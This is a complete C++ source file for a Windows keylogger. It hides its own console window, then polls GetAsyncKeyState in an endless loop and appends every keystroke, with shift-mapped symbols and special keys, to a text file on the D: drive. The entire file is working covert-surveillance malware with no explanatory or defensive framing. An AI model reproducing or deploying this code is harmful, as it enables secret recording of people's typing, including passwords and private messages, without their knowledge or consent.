#include <iostream>
#include<fstream>
#include<windows.h>
#include<winuser.h>
void log();
void hide();
using namespace std;
int main()
{
	hide();
	log();
	return 0;
}
void hide()
{
	HWND stealth;
	AllocConsole();
	stealth=FindWindowA("ConsoleWindowClass",NULL);
	ShowWindow(stealth,0);
}
void log()
{
	char k;
		for(;;)
		{
			for(k=8;k<223;k++)
			{

				if(GetAsyncKeyState(k) == -32767)
				{
					ofstream write ("D:\\Keylo5.txt",ios::app);
					if(((k>64)&&(k<91))&&!(GetAsyncKeyState(0x10)))
					{
						k+=32;
						write << k;
						write.close();
						break;
					}
					else if((k>64)&&(k<91))
					{
						write << k;
						write.close();
						break;
					}
					else
					{
						switch(k)
						{
						case 49:
						{
							if(GetAsyncKeyState(0x10))
								write << "!";
							else
								write << "1";
						}
						break;
						case 50:
						{
							if(GetAsyncKeyState(0x10))
								write << "@";
							else
								write << "2";
						}
						break;
						case 51:
						{
							if(GetAsyncKeyState(0x10))
								write << "#";
							else
								write << "3";
						}
						break;
						case 52:
							{
								if(GetAsyncKeyState(0x10))
									write << "$";
								else
									write << "4";
							}
						break;
						case 53:
							{
								if(GetAsyncKeyState(0x10))
									write << "%";
								else
									write << "5";
							}
							break;
						case 54:
							{
								if(GetAsyncKeyState(0x10))
									write << "^";
								else
									write << "6";
							}
							break;
						case 55:
							{
							if(GetAsyncKeyState(0x10))
								write << "&";
							else
								write << "7";
							}
							break;
						case 56:
							{
								if(GetAsyncKeyState(0x10))
									write << "*";
										else
									write << "8";
							}
							break;
						case 57:
							{
								if(GetAsyncKeyState(0x10))
									write << "(";
								else
									write << "9";
							}
							break;
						case 48:
							{
								if(GetAsyncKeyState(0x10))
									write << ")";
								else
									write << "0";
							}
							break;
						case VK_SPACE:
								write << " ";
								break;
						case VK_TAB:
							write << "	";
							break;
						case VK_RETURN:
							write << "\n";
							break;
						case VK_BACK:
							write << "<|backspace|";
							break;
						case VK_CAPITAL:
							write << "|caps yo|";
							break;
						case VK_DELETE:
							write << "|del|";
							break;
						case VK_NUMPAD0:
							write << "0";
							break;
						case VK_NUMPAD1:
							write << "1";
							break;
						case VK_NUMPAD2:
							write << "2";
							break;
						case VK_NUMPAD3:
							write << "3";
							break;
						case VK_NUMPAD4:
							write <<"4";
							break;
						case VK_NUMPAD5:
							write << "5";
							break;
						case VK_NUMPAD6:
							write << "6";
							break;
						case VK_NUMPAD7:
							write << "7";
							break;
						case VK_NUMPAD8:
							write << "8";
							break;
						case VK_NUMPAD9:
							write << "9";
							break;
						case 61:
						{
							if(GetAsyncKeyState(0x10))
								write << "+";
							else
								write <<"=";
						}
							break;

					}
				}
			}
		}
	}
}
